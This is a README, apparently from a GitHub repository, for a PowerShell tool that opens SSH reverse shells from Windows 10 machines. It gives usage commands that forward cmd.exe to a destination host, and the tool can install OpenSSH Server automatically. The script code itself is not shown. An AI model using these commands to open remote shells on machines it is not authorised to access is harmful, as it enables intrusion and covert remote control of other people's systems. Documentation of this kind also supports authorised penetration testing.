# lol-reverseSSHell.ps1
Living Off the LAN - Reverse SSHell

This script is designed to facilitate SSH reverse shells on Windows 10 by leveraging OpenSSH Server. Instead of relying on NetCat (NCat), it uses OpenSSH for seamless 
forwarding of a CMD.exe shell. If the required OpenSSH server is not installed on the host machine, the script can automatically install it using Windows capabilities or DISM.

## Setup Instructions
To ensure secure operation, please generate new SSH key pairs. The keys provided in this repository are intended solely for testing purposes and should not be used for 
production environments.

## Setup Instructions for SSH Keypairs and Help Documentation: 
```Bash
get-help .\lol-reverseSSHell.ps1 
```
```Bash 
get-help .\lol-reverseSSHell.ps1 -Examples
```

## Usage: 
```Bash
.\lol-reverseSSHell.ps1 -DestinationUserName <user> -DestinationHost <IP Address>
```
```Bash
.\lol-reverseSSHell.ps1 -DestinationUserName aj -DestinationHost 10.10.10.10 -DestinationPort 22 -DestinationBindLocalPort 7777 -InstallOpenSSHServer yes 
```
 -OR- 
```Bash
Double Click .bat file and enter requested information.
```

Remote cmd.exe in a bash terminal via ssh: 
![alt text](https://github.com/ArronJablonowski/lol-reverseSSHell/blob/main/image.png?raw=true)
Remotely executing commands via cmd.exe and powershell.exe:  
![alt text](https://github.com/ArronJablonowski/lol-reverseSSHell/blob/main/image02.png?raw=true)
